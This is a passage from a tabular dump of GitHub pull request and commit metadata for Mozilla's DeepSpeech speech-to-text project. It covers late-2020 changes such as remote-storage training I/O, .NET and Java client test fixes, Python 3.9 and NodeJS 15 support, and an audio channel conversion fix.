Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b5b3b2546ca5ba9581b833194921fe9f23daaf3e,Clean up remote I/O docs
312,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,611633fcf64faaa168dbf4c50f799499902a2b2a,Remove unnecessary uses of `open_remote()` where we know `__file__` will always be local
313,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0678cd1b70d2207dfb29c29863a31eb255971a7,Remove unused unordered imap from LimitPool
314,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3416,3416,.NET Client Binding Fix,,lissyx,1645737,2020-11-09T09:02:08Z,COLLABORATOR,True,20,2,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1be44c63fc1b241cc41fdcfb70b59fc4274cfc3d,Hotword support for .NET client tests
315,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3414,3414,.NET Client Binding Fix,Refer to the Issue #3336 ,imrahul361,36432937,2020-11-07T21:57:23Z,CONTRIBUTOR,False,19,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0f6c06d18e6c4020bfe67f77bf7a764e1f4383d,.NET Client Binding Fix
316,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3414,3414,.NET Client Binding Fix,Refer to the Issue #3336 ,imrahul361,36432937,2020-11-07T21:57:23Z,CONTRIBUTOR,False,19,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9dbf1f43c03859728d9b3b7955c026ab427481e3,Run test on CI for .NET Client
317,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3414,3414,.NET Client Binding Fix,Refer to the Issue #3336 ,imrahul361,36432937,2020-11-07T21:57:23Z,CONTRIBUTOR,False,19,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,900a3c10679c8cabdbd3aafba35b9d2fa5f12bf1,Run test on CI for .NET Client
318,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3414,3414,.NET Client Binding Fix,Refer to the Issue #3336 ,imrahul361,36432937,2020-11-07T21:57:23Z,CONTRIBUTOR,False,19,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f2a82f719b643f6e4e817c2aee2d3bd82b97bb96,Run test on CI for .NET Client
319,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3414,3414,.NET Client Binding Fix,Refer to the Issue #3336 ,imrahul361,36432937,2020-11-07T21:57:23Z,CONTRIBUTOR,False,19,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09a6630f8d11833612822179f7652f47ed120b3f,Run test on CI for .NET Client
320,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3411,3411,Run test On Java Client,,lissyx,1645737,2020-11-05T17:57:55Z,COLLABORATOR,True,33,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ac6b4fda604a8b792242add1d4d1013d52073a2,Run test On Java Client
321,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3410,3410,Run test On Java Client,For the issue #3336 ,imrahul361,36432937,2020-11-05T17:52:40Z,CONTRIBUTOR,True,33,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ac6b4fda604a8b792242add1d4d1013d52073a2,Run test On Java Client
322,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3409,3409,initial commit for py39 support,,lissyx,1645737,2020-11-05T08:52:27Z,COLLABORATOR,True,224,18,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,965f2096657ff4a9437e07add1d3608d403ec6b9,initial commit for py39 support
323,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3408,3408,Pr 3406,,lissyx,1645737,2020-11-04T17:07:58Z,COLLABORATOR,True,224,18,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a2879933f932f4c9bb53d0f0781035f58567652,initial commit for py39 support
324,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3406,3406,py39 support,"Closes #3405 

Am I missing something else?

Also, not sure how to deal with DISABLED file in taskcluster, just created another one, better than safe than sorry.",dag7dev,44711271,2020-11-04T14:56:45Z,CONTRIBUTOR,False,219,15,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7cae0c947dbeb6bafb8f466ccc98cd21eee248a1,initial commit for py39 support
325,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3406,3406,py39 support,"Closes #3405 

Am I missing something else?

Also, not sure how to deal with DISABLED file in taskcluster, just created another one, better than safe than sorry.",dag7dev,44711271,2020-11-04T14:56:45Z,CONTRIBUTOR,False,219,15,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a9fa6269dab15fe5848f781857c26e0ae11b26b4,"- fixed: funny leftover
- updated: hash of pyenv, courtesy of lissyx
- removed: bad extension files
- added: proper examples"
326,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3406,3406,py39 support,"Closes #3405 

Am I missing something else?

Also, not sure how to deal with DISABLED file in taskcluster, just created another one, better than safe than sorry.",dag7dev,44711271,2020-11-04T14:56:45Z,CONTRIBUTOR,False,219,15,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4446d763355ec4730a5cfc963e48dd924b5d3635,"updated pyenv number

What would it be our lucky number?"
327,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3402,3402,Run CI for #3395,,reuben,477142,2020-11-03T17:52:43Z,MEMBER,True,6,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a92fa40cae1bc16cb2fabf5d0f513d0fc00f94e,Make variables consistent
328,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3402,3402,Run CI for #3395,,reuben,477142,2020-11-03T17:52:43Z,MEMBER,True,6,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,98e75c3c0370effbcdff7cdd7560ad2cbec3f105,Call the logits probs in `create_inference_graph` after they go thru softmax
329,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3399,3399,Force npm install on RTD and set appropriate PATH value,,lissyx,1645737,2020-11-03T13:38:19Z,COLLABORATOR,True,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,617ce141d08ec9f3d3aea22d1fc761c2bcf9e426,Force npm install on RTD and set appropriate PATH value
330,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3398,3398,Force npm install on RTD and set appropriate PATH value,,lissyx,1645737,2020-11-03T13:36:37Z,COLLABORATOR,True,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1cd5e44a52c8ef05879fcc1d1b2334d706d39f37,Force npm install on RTD and set appropriate PATH value
331,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3396,3396,Run test On Java Client,,lissyx,1645737,2020-11-03T09:27:57Z,COLLABORATOR,True,33,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ac6b4fda604a8b792242add1d4d1013d52073a2,Run test On Java Client
332,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3395,3395,Minor Training Variable Consistency fix,"Half question & half PR, but if I follow the code correctly, these `outputs['outputs']` are already softmax'ed, so they're probs, not logits, yes? This tripped me up as I sat here double-softmaxing and washing out my probabilities for a little while.",CatalinVoss,332459,2020-11-03T05:10:49Z,COLLABORATOR,True,6,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a92fa40cae1bc16cb2fabf5d0f513d0fc00f94e,Make variables consistent
333,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3395,3395,Minor Training Variable Consistency fix,"Half question & half PR, but if I follow the code correctly, these `outputs['outputs']` are already softmax'ed, so they're probs, not logits, yes? This tripped me up as I sat here double-softmaxing and washing out my probabilities for a little while.",CatalinVoss,332459,2020-11-03T05:10:49Z,COLLABORATOR,True,6,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,98e75c3c0370effbcdff7cdd7560ad2cbec3f105,Call the logits probs in `create_inference_graph` after they go thru softmax
334,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3393,3393,Run test On Java Client,"Refer to the Issue #3336 

Running HotWord test on Java client with some Hardcoded words and their boost values.",imrahul361,36432937,2020-11-02T14:02:34Z,CONTRIBUTOR,True,33,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ac6b4fda604a8b792242add1d4d1013d52073a2,Run test On Java Client
335,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3391,3391,Add server code,"First of all, I want to thank you for building such a wonderful product, and open sourcing it. We are currently using this at my workplace, and so far it has served our needs really well.

I would like to contribute a simple server that I've built, that serves the inference results over a websocket. This server code is currently being used at my workplace, and is fairly battle tested.",opensorceror,10184251,2020-10-29T11:55:14Z,NONE,False,871,0,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ffa01c2a4b6b83dc12a9761834970e362591b878,Add server code
336,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3391,3391,Add server code,"First of all, I want to thank you for building such a wonderful product, and open sourcing it. We are currently using this at my workplace, and so far it has served our needs really well.

I would like to contribute a simple server that I've built, that serves the inference results over a websocket. This server code is currently being used at my workplace, and is fairly battle tested.",opensorceror,10184251,2020-10-29T11:55:14Z,NONE,False,871,0,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ff895f4a83a2faf8e70936586cbd2aa3c1e4afc,Address pylint issues
337,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3390,3390,note about perf testing,X-DeepSpeech: NOBUILD,JRMeyer,8389864,2020-10-28T14:23:54Z,CONTRIBUTOR,True,3,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b732e3956790e17838b816e741c4167a5324d0e5,"note about perf testing

X-DeepSpeech: NOBUILD"
338,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3389,3389,Use HTTPS in README.md,@lissyx,suriyaa,5073946,2020-10-27T10:04:56Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,87c44d75a3e141d0830248a12ed28f39cc5bd09f,Use HTTPS in README.md
339,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3388,3388,Node15 r0.9,Same as #3383 for 0.9 branch,ftyers,449545,2020-10-26T17:11:39Z,COLLABORATOR,True,2578,10,33,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,719fedbd939f71215f808b8726bdc7eac207430a,update for NodeJS 15
340,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29b39fd2d5dfa411ce9616dbff23bbbdedf9f49b,JS Binding Fix
341,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,368f76557a911eb46c2cd964891f92df37e2711e,Run Tests on CI for JS Client
342,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9df89bd945fc095d2367052c7951b368f1e95e1b,Fix JavaScript binding calls for Hot Words
343,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ca237d19b1d57abbfcc59005514a035d72b977c,"Merge pull request #3361 from imrahul361/master

enable hot-words boosting for Javascript"
344,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2ca91039c88a71b65f7c6b2c3d8b62d160d63b63,"Tiny fix to addHotWord doc string parameters

As the parameter for boost was actually written as ""word"" in the doc string, it was replacing the previous type for word with the type intended for boost and not showing any type for boost, thus messing up what displayed on https://deepspeech.readthedocs.io/en/master/Python-API.html"
345,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,435b20d53036c915f8685d90e6a9da2cce4d0995,"Merge pull request #3369 from nmstoker/patch-1

Tiny fix to addHotWord doc string parameters"
346,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f753b86ca9000f4288f2814989c1759ac9eea7fe,"[docs/typos/enhance] - mozilla/deepspeech/readme.rst - update

[docs/typos/enhance] - mozilla/deepspeech/readme.rst - update"
347,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,51e351e895b845e48f64f2ccb84d3bbb2b0d3379,"Merge pull request #3370 from tiagomoraismorgado/patch-1

X-DeepSpeech: NOBUILD"
348,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9fc614d8a332e3c542668abb01aa2395c87a2ad,Minor spelling fixes to CONTRIBUTING.rst X-DeepSpeech: NOBUILD
349,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e508cd30b76ee3a7ec05e649027dd4309e94aafb,"Merge pull request #3377 from actual-kwarter/master

Minor spelling fixes to CONTRIBUTING.rst X-DeepSpeech: NOBUILD"
350,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,521842deea720713176bcafabc8674d40b6f5878,"Convert channels for CV2 dataset

When running a training session on the CV2 dataset, it is possible to get the following error:

```
ValueError: Mono-channel audio required
```

This makes the [pysox Transformer](https://pysox.readthedocs.io/en/latest/api.html#sox.transform.Transformer.convert) also convert the channels."
351,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0798698e978107b8b294fbb4b66757ee1f7b6eb5,"Merge pull request #3380 from piraka9011/patch-1

Convert channels for CV2 dataset"
352,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3386,3386,Add missing sys import to import_voxforge.py,,liezl200,1223842,2020-10-23T17:59:54Z,CONTRIBUTOR,False,24,9,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af7c4e90df5f4d1a616e6fd728ee3428b69be155,Add missing sys import to import_voxforge.py
353,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3385,3385,Add missing sys import to import_voxforge.py,Quick fix,liezl200,1223842,2020-10-23T09:10:49Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af7c4e90df5f4d1a616e6fd728ee3428b69be155,Add missing sys import to import_voxforge.py
354,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3383,3383,update for NodeJS 15,This will fix #3382.,ftyers,449545,2020-10-21T15:07:26Z,COLLABORATOR,True,2578,10,33,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,55e31c402514d139a92dcb92c8019d4570169592,update for NodeJS 15
355,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2e16d388ce0445b9642718df579d19ec6a82abc3,Add support for netStandard2.1 and  netcoreapp3.1
356,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4371435f157e117c7e15d98525a00eb731b4a3fa,Update deprecated code
357,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,050854c3046dafc543d49d63b9f18b89c650e49b,"Removed AnyCPU from sln
moved test sound file to shared folder, using link now"
358,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d176e9de58f6632d8f1091c489b9680d3766ec8,using existing audio file
359,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,824fc2645fca5c246630f39eaeea59e1764e1b49,Merge branch 'master' of https://github.com/mozilla/DeepSpeech
360,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ff60e7f812d94cc6a78fb7c4eeda7ea89cd7975,update dotnet docs
361,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e924094509101858cca2a4a601d67bcee57fd95f,update readme
362,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f3a7989528b9fd7bd00e470f147d433fc6e0075,add support for anyCPU in dotnet
363,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc242f1f932423969d87bfa5e79598bd60c08b7d,back to direct link in dotnet readme
364,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,18470c4a46e0ce60eb362962d2294391508435ff,update internal link for dotnet docs
365,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cadc98cee81c811c53086cb09ca96895785e876d,more readme upd
366,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a57bd0f8f649208004cca3abf74f7063c22dfdc0,more readme rst upd
367,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb056db664ff8218efc15006434dea4f697e657f,revert to direct link readme
368,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8c953c50bc433b74b327c3197bbca49e3cf9f11,WIP: update dotnet build funcs
369,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,293bd75fb0b83e82a54437b92117f2544c3f7b96,WIP: Add tests for Net core console app
370,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34eefe8e5a726625fc32e29384e5f018a83103d8,final readme update
371,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3381,3381,Pr 3373,,carlfm01,32177100,2020-10-18T03:00:27Z,COLLABORATOR,False,270,48,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f72326633bc60d88e528ee983845e7c3b1f5854a,dotnet csproj fix for CI
372,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3380,3380,Convert channels for CV2 dataset,"When running a training session on the CV2 dataset, it is possible to get the following error:

```
ValueError: Mono-channel audio required
```

This makes the [pysox Transformer](https://pysox.readthedocs.io/en/latest/api.html#sox.transform.Transformer.convert) also convert the channels.

## Testing

```
bin/import_cv2.py --filter_alphabet data/alphabet.txt data/cv2/cv-corpus-5.1-2020-06-22/en/
```",piraka9011,16828657,2020-10-15T15:23:35Z,CONTRIBUTOR,True,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,521842deea720713176bcafabc8674d40b6f5878,"Convert channels for CV2 dataset

When running a training session on the CV2 dataset, it is possible to get the following error:

```
ValueError: Mono-channel audio required
```

This makes the [pysox Transformer](https://pysox.readthedocs.io/en/latest/api.html#sox.transform.Transformer.convert) also convert the channels."
